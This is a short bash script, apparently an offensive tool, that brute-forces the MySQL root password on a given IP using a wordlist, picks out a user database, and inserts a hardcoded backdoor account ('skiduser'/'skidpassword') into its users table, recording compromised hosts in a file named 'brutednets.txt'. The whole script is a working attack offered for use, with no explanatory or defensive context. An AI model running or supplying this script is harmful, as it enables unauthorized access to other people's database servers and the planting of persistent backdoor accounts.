#!/bin/bash
filename=$1
ip=$2
passwds=(`cat "$filename"`)
for i in "${passwds[@]}"
do echo "Trying $i"
  db=$(mysql -h $ip -u root -p$i -e "show databases;" | grep "\|" | grep -v "_schema" | grep -v "Database" | grep -v "mysql")
  echo "Found Database: $db"
  gdb=$(echo $db | tr -d '\040\011\012\015')
  aa=$(mysql -h $ip -u root -p$i -e "use $gdb; INSERT INTO users VALUES (NULL, 'skiduser', 'skidpassword', 0, 0, 0, 0, -1, 1, 30, '');")
  if [[ $aa == *"Query OK"* ]]; then
    echo "$ip:skiduser:skidpassword" >> brutednets.txt
    echo "GOTTEM: $ip:skiduser:skidpassword"
    exit 1
  fi
done
